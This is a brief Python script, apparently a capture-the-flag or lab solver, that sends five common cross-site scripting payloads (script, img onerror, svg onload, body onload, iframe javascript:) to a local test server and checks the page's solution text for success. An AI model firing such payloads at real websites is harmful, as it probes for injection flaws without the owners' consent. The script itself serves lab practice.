# XSS Payload Test
import urllib.parse, socket, sys, re, time
host="127.0.0.1"
port=33081
path="/page"

print("XSS Payload Testing Starting")

payloads=[
("1 script","<script>alert('XSS')</script>"),
("2 img","<img src=x onerror=alert('XSS')>"),
("3 svg","<svg onload=alert('XSS')>"),
("4 body","<body onload=alert('XSS')>"),
("5 iframe",'<iframe src="javascript:alert(\\'XSS\\')"></iframe>')
]

for n,p in payloads:
 print(f"\nTesting {n}")
 enc=urllib.parse.quote(p,safe='')
 req=f"GET {path}?name={enc} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
 
 try:
  s=socket.socket()
  s.settimeout(15)
  s.connect((host,port))
  s.send(req.encode())
  resp=s.recv(16384).decode('utf-8',errors='ignore')
  s.close()
  
  m=re.search(r'<div class="solution-text"[^>]*>(.*?)</div>',resp,re.DOTALL)
  if m:
   sol=re.sub(r'<[^>]+>','',m.group(1)).strip()
   print(f"Raw: {p}")
   print(f"sol: {sol[:200]}")
   if "Failed! Try again!" not in sol:
    print(f"SUCCESS with {n}")
    print(f"Payload: {p}")
    print(resp)
    sys.exit(0)
   else:
    print("Failed")
  else:
   print("no solution div")
 except Exception as e:
  print(f"Error: {e}")
 time.sleep(1)

print("\nNo working payload found")
